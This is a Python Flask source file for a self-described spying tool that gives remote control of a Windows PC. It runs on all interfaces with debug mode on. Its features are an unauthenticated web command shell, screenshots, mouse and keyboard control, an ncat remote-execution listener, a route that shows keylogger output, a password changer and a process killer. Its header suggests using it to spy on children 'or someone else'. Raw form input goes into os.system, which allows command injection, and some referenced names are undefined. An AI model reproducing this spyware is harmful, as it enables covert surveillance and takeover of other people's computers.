"""
This web app is completly programmed by --> *** Shail Murtaza *** <-- at backend and most of frontend
Enjoy this as this is created by me for only practicing purposes to test my skills and to learn new things
Feel free to upgrade it and upload to github but take this project with name of orignal developer
Login/signup page has been taken from CodePen LINK ::
--> https://codepen.io/andytran/
SecretZone button style has also been taken from CodePen LINK ::
--> https://codepen.io/hilwat
You can also use it to spy on your children or someone else
"""
import time
from flask import Flask, render_template, request, redirect, url_for, send_file, abort
import os
import pyautogui
from subprocess import check_output
# from email.mime import message, image, text, multipart, nonmultipart, base, audio


wd = os.getcwd()
app = Flask(__name__)


# This function contains features of sending shutdown time, message sending and reciving
@app.route('/index1')
def index1():
    return render_template('index.html')

# This function contains features of sending shutdown time, message sending and reciving
@app.route('/')
def index():
    shail = "Created by Shail "
    alert = "alert(shail);"
    return render_template('index.html', shail=shail, alert=alert)

# This will shutdown computer with time taken from function index
@app.route('/time', methods=['POST', 'GET'])
def shutdown():
    if request.method == 'POST':
        ttime = request.form['time']
        da = ("shutdown /t " + ttime + " /f /s")
        os.system(da)
        return redirect(url_for("index"))

# This will send message to computer and reply to sender
@app.route('/mesg', methods=['POST', 'GET'])
def messsage():

    if request.method == 'POST':
        mesg = request.form['mesgg']
        meesg = str(mesg)
        alert = "alert(shail);"
        pyautogui.alert(text=meesg, title='Alert box', button='OK')
        shail = pyautogui.prompt(text=meesg, title='Alert')
        shail = "User say: " + str(shail)
        return render_template('index.html', shail=shail, alert=alert)

# This is only a menu
@app.route('/secret-zone')
def secret_zone():
    return render_template("secret-zone/secret-zone.html")

# This will send command to shot_name() function to take screenshot
@app.route("/screenshots")
def screenshot():
    return render_template("secret-zone/screenshots/scree.html")  # , alert=alert, shail=shail)

# this will take screenshots
@app.route('/sc', methods=['POST', 'GET'])
def shot_name():
    if request.method == 'POST':
        nam = request.form['nam']
        myScreenshot = pyautogui.screenshot()
        nam = (wd + "\\templates\\secret-zone\\screenshots\\captured\\" + nam + ".png")
        myScreenshot.save(nam)
        return redirect(url_for('screenshot'))

# This is delete screenshots for you
@app.route('/del', methods=['POST', 'GET'])
def shot_del():
    if request.method == 'POST':
        namee = request.form['namee']
        wd = os.getcwd()
        sshh = ("del " + '"' + wd +
                "\\templates\\secret-zone\\screenshots\\captured\\" + namee + '.png"')
        os.system(sshh)
        return redirect(url_for('screenshot'))
    else:
        return "Not any input"

# This will allow you to controll mouse and keyboard
@app.route('/mouse_keyboard')
def mouse_keyboard():
    screen_resolution = pyautogui.size()
    return render_template("secret-zone/mouse_keyboard/mouse_keyboard.html", screen_resolution=screen_resolution)

# This will move mouse cursor by getting post requests from above mouse_keyboard function
@app.route('/mouse', methods=["POST", "GET"])
def mouse():
    if request.method == "POST":
        x_cor = request.form["x-cor"]
        y_cor = request.form["y-cor"]
        x_cor = str(x_cor)
        y_cor = str(y_cor)
        try:
            x_corr = x_cor.split(",")
            y_corr = y_cor.split(",")
            if len(x_corr) == len(y_corr):
                for i in range(len(x_corr)):
                    pyautogui.moveTo(int(x_corr[i]), int(y_corr[i]), 0.5)
                return redirect(url_for("mouse_keyboard"))
            else:
                return "<h1>Somethong is not correct. Please check your entered values</h1>"
        except:
            return "<h1>Somethong is not correct. Please check your entered values</h1>"


@app.route('/keyboard', methods=["POST", "GET"])
def keyboard():
    if not session.get('logged_in'):
        return ip_func(func="keyboard")
    else:
        if request.method == "POST":
            write = str(request.form["write"])
            press = str(request.form["presses"])
            print(press)
            try:
                write = list(write)
                print(write)
                time.sleep(4)
                pyautogui.press(write, presses=(int(press)), interval=1)
                return redirect(url_for("mouse_keyboard"))
            except:
                return "<h1>Check your input</h1>"

# This will start ncat for you at local network with tcp port of 444
# so you can easily execute commands remotely
@app.route('/ncat')
def ncat():
    shail = ('"' + os.getcwd() + "\\templates\\secret-zone\\ncat\\run.vbs" + '"')
    os.system(shail)
    return redirect(url_for('secret_zone'))

# this is web based windows task manager
@app.route('/task')
def task():
    cmdd = check_output("tasklist", shell=True)
    return render_template("secret-zone/killer/taskkk.html", cmdd=cmdd)

# This is web based windows task killer
@app.route('/killer', methods=['POST', 'GET'])
def killer():

    if request.method == 'POST':
        pid = request.form['pid']
        os.system("taskkill /F /PID " + pid)
        return redirect(url_for('task'))

# This is windows keylogger
@app.route("/logger")
def logger():
    logger = ("type C:\\Users\\Public\\System32Log.txt")
    loggs = check_output(logger, shell=True)
    return "<html><head><title>windows logger</title><body><button type=button onclick=" + '"' + "location.href='secret-zone';" + '"' + ">Go back</button><br><pre>" + loggs + "</pre></body></html>"

# This is web based command shell
@app.route("/shell", methods=['POST', 'GET'])
def shell():
    if request.method == 'POST':
        try:
            command = request.form['comd']
            comdd = check_output(command, shell=True)
            return render_template('secret-zone/shell/shell.html', comdd=comdd)
        except:
            error = "An error has been occurred"
            return render_template('secret-zone/shell/shell.html', error=error)
    else:
        return render_template('secret-zone/shell/shell.html')

# This is windows password changer
@app.route("/password", methods=['POST', 'GET'])
def password():
    html_pass = "<html><center><form method=POST action=password><input style=width:175; type=text name=pasw placeholder=" + \
        '"' + "Enter password to change" + '"' + "><input type=submit value=Change></form></center></html>"
    html_pass1 = "<html><script>alert(" + '"' + "Cancelled by users \\n      Try again" + '"' + ");</script><center><form method=POST action=password><input style=width:175; type=text name=pasw placeholder=" + \
        '"' + "Enter password to change" + '"' + "><input type=submit value=Change></form></center></html>"
    html_pass2 = "<html><script>alert(" + '"' + "Password has been changed successfully" + '"' + ");</script><center><form method=POST action=password><input style=width:175; type=text name=pasw placeholder=" + \
        '"' + "Enter password to change" + '"' + "><input type=submit value=Change></form></center></html>"
    if request.method == 'POST':
        passw = request.form['pasw']
        time.sleep(3)
        shail = ('"' + wd + "\\static\\sys-gamer.exe" + '" ' + passw)
        changed = (check_output(shail).decode())
        print(changed)
        if changed == u'ha\r\n':  # True
            return html_pass2
        else:  # False
            return html_pass1
    else:
        return html_pass

# Games Section starts
@app.route('/games')
def games():
    return render_template("secret-zone/games/games-list.html")


@app.route('/static/snake_pc')
def snake_pc():
    return render_template("secret-zone/games/snake.html")


@app.route('/static/hexgl')
def hexgl():
    return render_template("secret-zone/games/hexgl.html")


@app.route('/static/clumsy-bird-master/clumsy_bird')
def clusmy_bird():
    return render_template("secret-zone/games/clumsy-bird.html")


@app.route('/static/radius_raid')
def radius_raid():
    return render_template("secret-zone/games/radius-raid.html")


@app.route('/static/pacman-canvas-master/pacman_canvas')
def pacman_canvas():
    return render_template("secret-zone/games/pacman-canvas.html")


@app.route('/static/popup')
def pop_up():
    return render_template("secret-zone/games/pop.html")


@app.route('/static/hextris-gh-pages/hextris')
def hextris():
    return render_template("secret-zone/games/hextris.html")


@app.route('/screenshot_list', defaults={'req_path': ''})
@app.route('/<path:req_path>')
def dir_listing(req_path):
    BASE_DIR = 'templates\\secret-zone\\screenshots\\captured\\'
    # Joining the base and the requested path
    abs_path = os.path.join(BASE_DIR, req_path)
    # Return 404 if path doesn't exist
    if not os.path.exists(abs_path):
        return abort(404)
    # Check if path is a file and serve
    if os.path.isfile(abs_path):
        return send_file(abs_path)
    # Show directory contents
    files = os.listdir(abs_path)
    return render_template('secret-zone/screenshots/screenshot_list.html', files=files)
# Games Section ends


@app.route("/test")
def test():
    f = open("requirements.txt", "r")
    contents = f.read()
    return "<pre>" + contents + "</pre>"

# error handler section starts
@app.errorhandler(404)
def page_not_found(e):
    return "<h1><center>Your page is not found duffer<br>Ha ha ha !!!</center></h1>", 404


@app.errorhandler(405)
def page(e):
    return "<h1><center>First enter username and password</center></h1>", 405
# error handler section ends


# if __name__ == '__main__':
app.secret_key = "shail567is789hacker"
app.run(debug=True, host="0.0.0.0", port=80)
